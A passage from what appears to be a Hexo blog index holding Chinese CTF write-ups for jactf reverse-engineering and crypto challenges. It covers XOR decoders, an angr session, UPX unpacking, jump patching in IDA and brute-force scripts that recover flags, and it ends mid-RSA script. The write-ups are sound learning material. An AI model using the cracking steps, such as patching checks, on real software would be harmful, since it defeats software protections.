&#123;</span><br><span class="line">      background: #fff;</span><br><span class="line">      opacity: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改菜单栏透明度</span></span><br><span class="line">.header-inner &#123;</span><br><span class="line">      opacity: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/images/pasted-77.png" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jactf-reverse2</title>
      <link href="/jactf-reverse2.html"/>
      <url>/jactf-reverse2.html</url>
      
        <content type="html"><![CDATA[<h3 id="简单的逻辑"><a href="#简单的逻辑" class="headerlink" title="简单的逻辑"></a>简单的逻辑</h3><p><img src="/images/pasted-50.png" alt="upload successful"></p><h4 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-51.png" alt="upload successful"></p><blockquote><p>关键函数<br><img src="/images/pasted-52.png" alt="upload successful"></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: flag = list(<span class="string">"GEV\odzchpc03"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: s = <span class="string">""</span></span><br><span class="line">   ...: <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">   ...:     <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">   ...:         s += chr(ord(flag[i])^<span class="number">3</span>)</span><br><span class="line">   ...:     <span class="keyword">elif</span> i%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">   ...:         s += chr((ord(flag[i])^<span class="number">3</span>)<span class="number">-1</span>)</span><br><span class="line">   ...:     <span class="keyword">elif</span> i%<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">   ...:         s += chr((ord(flag[i])^<span class="number">3</span>)<span class="number">-2</span>)</span><br><span class="line">   ...: <span class="keyword">print</span> s</span><br><span class="line">   ...:</span><br><span class="line">DES_key_is_10</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snake~:./re</span><br><span class="line">Please input your flag:</span><br><span class="line">DES_key_is_10</span><br><span class="line">you got it!</span><br><span class="line">GEV\odzchpc03<span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>可以得到是des加密，key为10</p></blockquote><blockquote><p>查看密文是啥</p></blockquote><p><img src="/images/pasted-107.png" alt="upload successful"></p><blockquote><p>解密</p></blockquote><p><img src="/images/pasted-108.png" alt="upload successful"><br><a href="https://tool.oschina.net/encrypt" target="_blank" rel="noopener">解密网站</a></p><h3 id="真假flag"><a href="#真假flag" class="headerlink" title="真假flag"></a>真假flag</h3><p><img src="/images/pasted-53.png" alt="upload successful"></p><blockquote><p>数学菜鸟在线百度查了下如何求多项式的最大公因式，说是用到了辗转相除法(欧几里得算法),但是好久都没学数学了<br><img src="/images/pasted-70.png" alt="upload successful"></p></blockquote><blockquote><p>在隔壁老阿姨的帮助下，化简了第二个式子<br>g(x) = x^3 + x^2 + x +1<br>     = x^2(x+1) + (x+1)<br>     = (x^2 + 1)(x+1)<br>由于第一个公式化简太繁琐，得到解压密码(x+1)</p></blockquote><h4 id="ida-1"><a href="#ida-1" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-71.png" alt="upload successful"></p><p><img src="/images/pasted-72.png" alt="upload successful"></p><p><img src="/images/pasted-73.png" alt="upload successful"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = list(<span class="string">"lfkmq:b+C~neoyd-~yoog~eho~boxcmb~kdy&#125;oxw"</span>)</span><br><span class="line">two = list(<span class="string">"y0y/|hka~ko??ajtoi"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">    flag[i] = chr(ord(flag[i])^<span class="number">0xA</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(two)):</span><br><span class="line">    two[i] = chr((ord(two[i])^<span class="number">7</span>)<span class="number">-7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> two)</span><br></pre></td></tr></table></figure><h3 id="Electroacoustic"><a href="#Electroacoustic" class="headerlink" title="Electroacoustic"></a>Electroacoustic</h3><p><img src="/images/pasted-59.png" alt="upload successful"></p><h4 id="upx-脱壳"><a href="#upx-脱壳" class="headerlink" title="upx 脱壳"></a>upx 脱壳</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">☁  jactf  upx -d run</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    913048 &lt;-    402252   44.06%   linux/amd64   run</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-60.png" alt="upload successful"></p><blockquote><p>主要是标注的四个函数,根据函数进行构造输入</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">snake~:./run</span><br><span class="line">1th input:aaaa</span><br><span class="line">2th input:43806</span><br><span class="line">3th input:978</span><br><span class="line">4th input:we11d0ne!</span><br><span class="line">Get your key:faded</span><br></pre></td></tr></table></figure><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p><img src="/images/pasted-54.png" alt="upload successful"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">☁  jactf  file <span class="built_in">source</span></span><br><span class="line"><span class="built_in">source</span>: PE32 executable (console) Intel 80386 Mono/.Net assembly, <span class="keyword">for</span> MS Windows</span><br></pre></td></tr></table></figure></p><h4 id="dnSpy"><a href="#dnSpy" class="headerlink" title="dnSpy"></a>dnSpy</h4><p><img src="/images/pasted-55.png" alt="upload successful"></p><blockquote><p>定位主函数</p></blockquote><p><img src="/images/pasted-56.png" alt="upload successful"></p><p><img src="/images/pasted-57.png" alt="upload successful"></p><p><img src="/images/pasted-58.png" alt="upload successful"></p><blockquote><p>主要流程：将输入的字符串进行加密后与key2进行比较</p></blockquote><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key1 = list(<span class="string">"flag&#123;Thi3_i3+A_wrong+str&#125;"</span>)</span><br><span class="line">key2 = [<span class="number">24</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">23</span>,<span class="number">66</span>,<span class="number">172</span>,<span class="number">49</span>,<span class="number">34</span>,<span class="number">246</span>,<span class="number">240</span>,<span class="number">25</span>,<span class="number">27</span>,<span class="number">224</span>,<span class="number">88</span>,<span class="number">253</span>,<span class="number">50</span>,<span class="number">254</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">31</span>,<span class="number">84</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">79</span>,<span class="number">117</span>,<span class="number">238</span>]</span><br><span class="line">seed = <span class="number">7</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(key2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> key2[i] == (j + seed ^ ord(key1[seed])) &amp; <span class="number">0xff</span>:</span><br><span class="line">            seed = (seed+<span class="number">1</span>)%<span class="number">25</span></span><br><span class="line">            flag +=chr(<span class="number">0x7f</span> &amp; j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="reversing"><a href="#reversing" class="headerlink" title="reversing"></a>reversing</h3><p><img src="/images/pasted-61.png" alt="upload successful"></p><h4 id="ida-2"><a href="#ida-2" class="headerlink" title="ida"></a>ida</h4><blockquote><p>将关键跳转修改成如下图所示<br><img src="/images/pasted-64.png" alt="upload successful"><br><img src="/images/pasted-63.png" alt="upload successful"><br><img src="/images/pasted-62.png" alt="upload successful"><br>动态调试即可得到flag</p></blockquote><h3 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h3><p><img src="/images/pasted-66.png" alt="upload successful"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><img src="/images/pasted-65.png" alt="upload successful"></p><blockquote><p>一共两个图片，看了一下文件的内容，可以看出来要分析第二张图片<br><img src="/images/pasted-67.png" alt="upload successful"></p></blockquote><p><img src="/images/pasted-68.png" alt="upload successful"></p><blockquote><p>可以在详细信息的备注里看到js的颜文字，直接浏览器</p></blockquote><p><img src="/images/pasted-69.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>没有目标的明天，是元气满满的一天</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> jactf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jactf-reverse</title>
      <link href="/jactf-reverse.html"/>
      <url>/jactf-reverse.html</url>
      
        <content type="html"><![CDATA[<h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p><a href="https://ctf.jasec.cn/challenges" target="_blank" rel="noopener">jactf</a></p><h3 id="reverse签到"><a href="#reverse签到" class="headerlink" title="reverse签到"></a>reverse签到</h3><p><img src="/images/pasted-29.png" alt="upload successful"></p><h4 id="签到无情，亦有情"><a href="#签到无情，亦有情" class="headerlink" title="签到无情，亦有情"></a>签到无情，亦有情</h4><p><img src="/images/pasted-30.png" alt="upload successful"></p><h3 id="re-easy"><a href="#re-easy" class="headerlink" title="re_easy"></a>re_easy</h3><p><img src="/images/pasted-31.png" alt="upload successful"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-32.png" alt="upload successful"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: pro = angr.Project(<span class="string">"re1"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: pro = angr.Project(<span class="string">"re1"</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: sm = pro.factory.simulation_manager(pro.factory.entry_state())</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: sm.explore(find=<span class="number">0x40091D</span>,avoid=<span class="number">0x4008FA</span>)</span><br><span class="line">Out[<span class="number">5</span>]: &lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> found, <span class="number">324</span> avoid&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">'bdctf&#123;YOU_CRAKE_THE_RC4&#125;'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]:</span><br></pre></td></tr></table></figure><h3 id="simplere"><a href="#simplere" class="headerlink" title="simplere"></a>simplere</h3><p><img src="/images/pasted-33.png" alt="upload successful"></p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-34.png" alt="upload successful"></p><blockquote><p>我们输入的字符串加密之后与str2比较</p></blockquote><blockquote><p>关键函数</p></blockquote><p><img src="/images/pasted-35.png" alt="upload successful"></p><p><img src="/images/pasted-37.png" alt="upload successful"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">102</span>,<span class="number">0xA</span>,<span class="number">0x6B</span>,<span class="number">0xC</span>,<span class="number">0x77</span>,<span class="number">0x12</span>,<span class="number">0x21</span>,<span class="number">25</span>,<span class="number">123</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">26</span>,<span class="number">41</span>,<span class="number">4</span>,<span class="number">48</span>,<span class="number">82</span>,<span class="number">52</span>,<span class="number">3</span>,<span class="number">46</span>,<span class="number">26</span>,<span class="number">127</span>,<span class="number">93</span>,<span class="number">21</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">31</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">95</span>,<span class="number">3</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">7</span>,<span class="number">78</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    flag[i] = flag[i] ^ flag[i<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">20</span>,<span class="number">-1</span>):</span><br><span class="line">    flag[i] = flag[i] ^ flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br></pre></td></tr></table></figure><h3 id="ELF64"><a href="#ELF64" class="headerlink" title="ELF64"></a>ELF64</h3><p><img src="/images/pasted-39.png" alt="upload successful"></p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-40.png" alt="upload successful"></p><blockquote><p>输入的数据md5加密后与780438d5b6e29db0898bc4f0225935c0相比较</p></blockquote><h4 id="somd5"><a href="#somd5" class="headerlink" title="somd5"></a>somd5</h4><p><img src="/images/pasted-41.png" alt="upload successful"></p><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby_reverse"></a>baby_reverse</h3><p><img src="/images/pasted-43.png" alt="upload successful"></p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-44.png" alt="upload successful"></p><p><img src="/images/pasted-45.png" alt="upload successful"></p><blockquote><p>输入加密比较，没什么可说的</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = list(<span class="string">"bIwhroo8cwqgwrxusi"</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">3</span>):</span><br><span class="line">    s += chr((ord(flag[i]) ^ <span class="number">18</span>) - <span class="number">6</span>)</span><br><span class="line">    s += chr((ord(flag[i+<span class="number">1</span>]) ^ <span class="number">18</span>) + <span class="number">6</span>)</span><br><span class="line">    s += chr(ord(flag[i+<span class="number">2</span>])^<span class="number">6</span>^<span class="number">18</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><h3 id="py"><a href="#py" class="headerlink" title="py"></a>py</h3><p><img src="/images/pasted-46.png" alt="upload successful"></p><h4 id="找一个在线反编译网站"><a href="#找一个在线反编译网站" class="headerlink" title="找一个在线反编译网站"></a>找一个在线反编译网站</h4><p><a href="https://tool.lu/pyc/" target="_blank" rel="noopener">pyc反编译</a></p><blockquote><p>反编译失败，查看文件头发现少了修改时间于是乎添上，解密得到python代码</p></blockquote><p><img src="/images/pasted-47.png" alt="upload successful"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'[-]Please input your key:'</span></span><br><span class="line">key = raw_input()</span><br><span class="line">flag = <span class="string">"=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"</span></span><br><span class="line">flags = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    <span class="keyword">if</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flags += chr(ord(key[q]) + <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flags += chr(ord(key[q]) - <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flags == flag:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-]Good!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-]Wrong!'</span></span><br></pre></td></tr></table></figure></p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = list(<span class="string">"=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"</span>)</span><br><span class="line">flags = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flags += chr(ord(flag[i]) - <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flags += chr(ord(flag[i]) + <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flags</span><br></pre></td></tr></table></figure><h3 id="C是最好的语言"><a href="#C是最好的语言" class="headerlink" title="C是最好的语言"></a>C是最好的语言</h3><p><img src="/images/pasted-48.png" alt="upload successful"></p><blockquote><p>难道不是我php是最好的语言吗</p></blockquote><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-49.png" alt="upload successful"></p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><blockquote><p>符号问题坑死人</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">对python还是不太熟悉</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v8;</span><br><span class="line">    <span class="keyword">int</span> flag[] = &#123;<span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">49</span>, <span class="number">56</span>, <span class="number">63</span>, <span class="number">70</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">113</span>, <span class="number">120</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">141</span>, <span class="number">148</span>, <span class="number">155</span>, <span class="number">162</span>, <span class="number">169</span>, <span class="number">176</span>, <span class="number">183</span>, <span class="number">190</span>, <span class="number">197</span>, <span class="number">205</span>, <span class="number">212</span>, <span class="number">219</span>, <span class="number">226</span>, <span class="number">233</span>, <span class="number">240</span>, <span class="number">247</span>, <span class="number">254</span>, <span class="number">261</span>, <span class="number">268</span>, <span class="number">275</span>, <span class="number">282</span>, <span class="number">289</span>, <span class="number">296</span>, <span class="number">304</span>, <span class="number">311</span>, <span class="number">318</span>, <span class="number">325</span>, <span class="number">332</span>, <span class="number">339</span>, <span class="number">346</span>, <span class="number">353</span>, <span class="number">360</span>, <span class="number">367</span>, <span class="number">374</span>, <span class="number">381</span>, <span class="number">388</span>, <span class="number">395</span>, <span class="number">403</span>, <span class="number">410</span>, <span class="number">417</span>, <span class="number">424</span>, <span class="number">431</span>, <span class="number">438</span>, <span class="number">445</span>, <span class="number">452</span>, <span class="number">459</span>, <span class="number">466</span>, <span class="number">473</span>, <span class="number">480</span>, <span class="number">487</span>, <span class="number">494</span>, <span class="number">502</span>, <span class="number">509</span>, <span class="number">516</span>, <span class="number">523</span>, <span class="number">530</span>, <span class="number">537</span>, <span class="number">544</span>, <span class="number">551</span>, <span class="number">558</span>, <span class="number">565</span>, <span class="number">572</span>, <span class="number">579</span>, <span class="number">586</span>, <span class="number">593</span>, <span class="number">601</span>, <span class="number">608</span>, <span class="number">615</span>, <span class="number">622</span>, <span class="number">629</span>, <span class="number">636</span>, <span class="number">643</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">664</span>, <span class="number">671</span>, <span class="number">678</span>, <span class="number">685</span>, <span class="number">692</span>, <span class="number">699</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,v9;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(flag)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;<span class="keyword">sizeof</span>(flag)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(k=j+<span class="number">1</span>;k&lt;<span class="keyword">sizeof</span>(flag)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);k++)&#123;</span><br><span class="line">                v9 = (flag[i]+flag[j]+flag[k])/<span class="number">2</span>;</span><br><span class="line">                v8 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v9-flag[k]) * ((v9-flag[j])*(v9-flag[i])) * v9);</span><br><span class="line">                v8 = <span class="built_in">sqrt</span>(v8*<span class="number">1.0</span>);</span><br><span class="line">                <span class="keyword">if</span>((v8 - <span class="number">58792</span>) &lt; <span class="number">0.1</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%d %d %d \n"</span>,flag[i],flag[j],flag[k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="快下班了-emmm…"><a href="#快下班了-emmm…" class="headerlink" title="快下班了,emmm….."></a>快下班了,emmm…..</h4>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> jactf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jactf-crypto</title>
      <link href="/jactf-crypto.html"/>
      <url>/jactf-crypto.html</url>
      
        <content type="html"><![CDATA[<h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p><a href="https://ctf.jasec.cn/challenges" target="_blank" rel="noopener">jactf</a></p><h3 id="crypto签到"><a href="#crypto签到" class="headerlink" title="crypto签到"></a>crypto签到</h3><p><img src="/images/pasted-19.png" alt="upload successful"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-20.png" alt="upload successful"></p><h3 id="贝斯家族三英战群魔！"><a href="#贝斯家族三英战群魔！" class="headerlink" title="贝斯家族三英战群魔！"></a>贝斯家族三英战群魔！</h3><p><img src="/images/pasted-21.png" alt="upload successful"></p><h4 id="ciphertext-txt"><a href="#ciphertext-txt" class="headerlink" title="ciphertext.txt"></a>ciphertext.txt</h4><p><img src="/images/pasted-22.png" alt="upload successful"></p><blockquote><p>base系列加解密</p></blockquote><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-23.png" alt="upload successful"></p><blockquote><p>三种来回试吧</p></blockquote><h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><p><img src="/images/pasted-25.png" alt="upload successful"></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p><img src="/images/pasted-24.png" alt="upload successful"></p><h3 id="凯撒变异了，从第五天开始学起了仿射"><a href="#凯撒变异了，从第五天开始学起了仿射" class="headerlink" title="凯撒变异了，从第五天开始学起了仿射"></a>凯撒变异了，从第五天开始学起了仿射</h3><p><img src="/images/pasted-26.png" alt="upload successful"></p><blockquote><p>太难了，待做</p></blockquote><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p><img src="/images/pasted-27.png" alt="upload successful"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span 